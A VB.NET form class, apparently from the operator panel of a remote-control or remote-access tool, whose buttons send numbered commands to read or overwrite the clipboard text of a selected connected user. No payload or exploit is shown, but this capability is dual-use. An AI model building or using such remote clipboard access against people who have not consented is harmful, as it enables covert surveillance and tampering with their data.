Public Class Clipboard

    ' Set Remote Clipboard Text
    Private Sub ButtonSetText_Click(sender As Object, e As EventArgs) Handles ButtonSetText.Click
        If Main.ListViewMain.Items.Count > 0 Then
            If Main.ListViewMain.SelectedItems.Count <> 0 Then _
                Main.SelectedUserID = Main.ListViewMain.SelectedItems(0).Text
        Else
            MsgBox("No Users online.", MsgBoxStyle.Exclamation)
        End If
        Try
            Main.WriteData(RichTextBoxClipboard.Text)
            Main.WriteCommand(Main.SelectedUserID & "|60")
            Waiting.ShowDialog()
        Catch x As Exception
            MsgBox("Unable to Send Command." & x.Message, MsgBoxStyle.OkOnly, "Clipboard")
        End Try
    End Sub

    ' Get Remote Clipboard Text
    Private Sub ButtonGetText_Click(sender As Object, e As EventArgs) Handles ButtonGetText.Click
        If Main.ListViewMain.Items.Count > 0 Then
            If Main.ListViewMain.SelectedItems.Count <> 0 Then _
                Main.SelectedUserID = Main.ListViewMain.SelectedItems(0).Text
        Else
            MsgBox("No Users online.", MsgBoxStyle.Exclamation)
        End If
        Try
            Main.WriteCommand(Main.SelectedUserID & "|61")
            Waiting.ShowDialog()
        Catch x As Exception
            MsgBox("Unable to Send Command." & x.Message, MsgBoxStyle.OkOnly, "Clipboard")
        End Try
    End Sub
End Class